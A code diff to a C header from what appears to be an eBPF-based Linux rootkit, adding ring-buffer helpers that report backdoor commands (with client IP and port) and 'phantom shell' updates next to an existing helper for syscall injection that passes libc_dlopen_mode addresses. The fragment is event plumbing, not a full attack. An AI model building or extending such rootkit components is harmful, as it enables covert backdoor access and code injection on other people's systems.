@@ -3,7 +3,9 @@
 
 /*#include <linux/bpf.h>
 #include <bpf/bpf_helpers.h>*/
+#ifndef __H_TCKIT
 #include "headervmlinux.h"
+#endif
 
 #include <bpf/bpf_tracing.h>
 #include <bpf/bpf_core_read.h>
@@ -43,6 +45,45 @@ static __always_inline int ring_buffer_send(struct ring_buffer *rb, int pid, eve
 }
 
 /**
+ * @brief Sends an event indicating a received command in the backdoor
+ * 
+ * @return 0 if ok, -1 if error
+ */
+static __always_inline int ring_buffer_send_backdoor_command(struct ring_buffer *rb, int pid, int code, __u32 ip, __u16 port){
+    struct rb_event *event = (struct rb_event*) bpf_ringbuf_reserve(rb, sizeof(struct rb_event), 0);
+    if(!event){
+        return -1;
+    }
+    event->code = code;
+    event->event_type = COMMAND;
+    event->pid = pid;
+    event->client_ip = ip;
+    event->client_port = port;
+
+	bpf_ringbuf_submit(event, 0);
+    return 0;
+}
+
+/**
+ * @brief Sends an event indicating a received command in the backdoor
+ * 
+ * @return 0 if ok, -1 if error
+ */
+static __always_inline int ring_buffer_send_request_update_phantom_shell(struct ring_buffer *rb, int pid, int code, struct backdoor_phantom_shell_data data){
+    struct rb_event *event = (struct rb_event*) bpf_ringbuf_reserve(rb, sizeof(struct rb_event), 0);
+    if(!event){
+        return -1;
+    }
+
+    event->code = code;
+    event->event_type = PSH_UPDATE;
+    event->pid = pid;
+    event->bps_data = data;
+    bpf_ringbuf_submit(event, 0);
+    return 0;
+}
+
+/**
  * @brief Sends an event indicating a vulnerable syscall injection into the specified ring kernel buffer 
  * 
  * @return 0 if ok, -1 if error
@@ -52,7 +93,6 @@ static __always_inline int ring_buffer_send_vuln_sys(struct ring_buffer *rb, int
     if(!event){
         return -1;
     }
-
     event->event_type = VULN_SYSCALL;
     event->pid = pid;
     event->libc_dlopen_mode_address = libc_dlopen_mode_address;
